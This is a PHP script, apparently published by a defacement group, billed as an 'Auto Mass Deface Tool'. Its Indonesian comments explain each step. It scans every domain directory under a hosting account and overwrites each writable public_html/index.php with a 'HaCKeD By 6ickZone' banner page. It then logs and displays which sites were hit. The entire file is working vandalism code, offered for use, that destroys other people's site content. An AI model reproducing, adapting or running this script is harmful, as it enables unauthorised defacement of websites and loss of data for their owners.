<?php
/**
 * Auto Mass Deface Tool
 * Author   : 0x6ick
 * GitHub   : https://github.com/6ickzone
 * Note     : 
 */

// Set zona waktu
date_default_timezone_set("Asia/Jakarta");

// Buat folder logs jika belum ada
$log_dir = __DIR__ . "/logs";
if (!file_exists($log_dir)) {
    mkdir($log_dir, 0777, true);
}

// Lokasi file log
$success_log = $log_dir . "/deface_success.log";
$failed_log  = $log_dir . "/deface_failed.log";

// Isi halaman deface yang akan ditanam
$deface_code = <<<HTML
<!DOCTYPE html>
<html>
<head>
  <title>Hacked by 0x6ick</title>
  <style>
    body {
      background: black;
      color: white;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .glitch {
      font-size: 3em;
      position: relative;
    }
    .glitch::before, .glitch::after {
      content: attr(data-text);
      position: absolute;
      left: 0;
    }
    .glitch::before {
      animation: glitchTop 1s infinite;
      color: #f0f;
      top: -2px;
    }
    .glitch::after {
      animation: glitchBot 1s infinite;
      color: #0ff;
      top: 2px;
    }
    @keyframes glitchTop {
      0% { left: -2px; }
      50% { left: 2px; }
      100% { left: -2px; }
    }
    @keyframes glitchBot {
      0% { left: 2px; }
      50% { left: -2px; }
      100% { left: 2px; }
    }
  </style>
</head>
<body>
  <div class="glitch" data-text="HaCKeD By 6ickZone">HaCKeD By 6ickZone</div>
  <p>6ickZone - Where Creativity, Exploitation, and Expression Collide.</p>
</body>
</html>
HTML;

// Path root semua domain
$basedir = "/home/u141571231/domains/"; // Ganti sesuai path servermu
$dirs = scandir($basedir);

// Penampung hasil
$success = [];
$failed  = [];

foreach ($dirs as $dir) {
    if ($dir != "." && $dir != "..") {
        $index_path = $basedir . $dir . "/public_html/index.php";

        if (is_writable(dirname($index_path))) {
            file_put_contents($index_path, $deface_code);
            $success[] = $dir;
            file_put_contents($success_log, "[" . date("Y-m-d H:i:s") . "] $dir\n", FILE_APPEND);
        } else {
            $failed[] = $dir;
            file_put_contents($failed_log, "[" . date("Y-m-d H:i:s") . "] $dir\n", FILE_APPEND);
        }
    }
}

// Tampilkan hasil
$timestamp = date("Y-m-d H:i:s");
$total = count($success) + count($failed);

echo <<<HTML
<!DOCTYPE html>
<html>
<head>
  <title>Mass Deface Report by 0x6ick</title>
  <style>
    body {
      background-color: #000;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
    }
    h2 { color: #0ff; }
    .fail { color: red; }
    .success { color: lime; }
  </style>
</head>
<body>
  <h2>Mass Deface Report by 0x6ick</h2>
  <p>Timestamp: <strong>$timestamp</strong></p>
  <p>Total Domains: <strong>$total</strong></p>
  <p>Success (<span class="success">" . count($success) . "</span>):</p>
  <ul>
HTML;

foreach ($success as $s) {
    echo "<li class='success'>[+] $s</li>";
}

echo "</ul><p>Failed (<span class='fail'>" . count($failed) . "</span>):</p><ul>";

foreach ($failed as $f) {
    echo "<li class='fail'>[-] $f</li>";
}

echo <<<HTML
</ul>
<p style="color:#888;">Logs saved to:<br><code>logs/deface_success.log</code> & <code>logs/deface_failed.log</code></p>
</body>
</html>
HTML;
?>
